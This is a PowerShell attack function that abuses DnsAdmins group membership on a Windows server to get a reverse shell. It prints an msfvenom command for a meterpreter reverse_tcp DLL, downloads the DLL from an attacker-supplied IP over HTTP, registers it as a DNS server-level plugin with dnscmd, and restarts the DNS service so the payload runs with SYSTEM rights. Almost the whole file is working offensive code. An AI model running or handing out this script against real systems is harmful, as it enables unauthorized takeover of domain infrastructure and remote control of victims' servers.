function invoke-dns
{

	<# The following script is if a user is within the dns admin group, this script is extremely dangerous
        Calls backs will continued to be made until serverlevelplugin is moved back to proper location
    #>

	[cmdletbinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $True)]
        [string]
        $AttackerIP
      )

       
    if ($AttackerIP)
    {

    	$LPORT = Read-Host -Prompt 'LPORT ex 4444'

    	write-host -foregroundcolor green -backgroundcolor black "First setup a serverplugin.dll utilizing msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$AttackerIP LPORT=$LPORT -f dll > serverlevelplugin.dll on $AttackerIP machine"

    	$confirmation = Read-Host "Did you make dll file and have a python web server running on port 80 (Y/N)?:"
      if ($confirmation -eq 'y')

      {
      	write-host -foregroundcolor yellow -backgroundcolor black "Downloading serverlevelplugin.dll and changing dnscmd config"

      	wget http://$AttackerIP/serverlevelplugin.dll -outfile C:\Windows\Temp\serverlevelplugin.dll

      	dnscmd 127.0.0.1 /config /serverlevelplugindll C:\Windows\Temp\serverlevelplugin.dll 

      }

      else
      {
      	
      }

      	$confirmation = Read-Host "Do you have a listener running on $AttackerIP on port $LPORT with metasploit, also this is the last time to stop script, extremely dangerous (Y/N)?:"
      if ($confirmation -eq 'y')

      {

      	write-host -foregroundcolor yellow -backgroundcolor black "Stopping DNS"

      	cmd /c "sc stop dns"

      	write-host -foregroundcolor yellow -backgroundcolor black "Starting DNS"

      	cmd /c "sc start dns"

      }
      else
      {
      	'Cancelled'
      }
    }
}
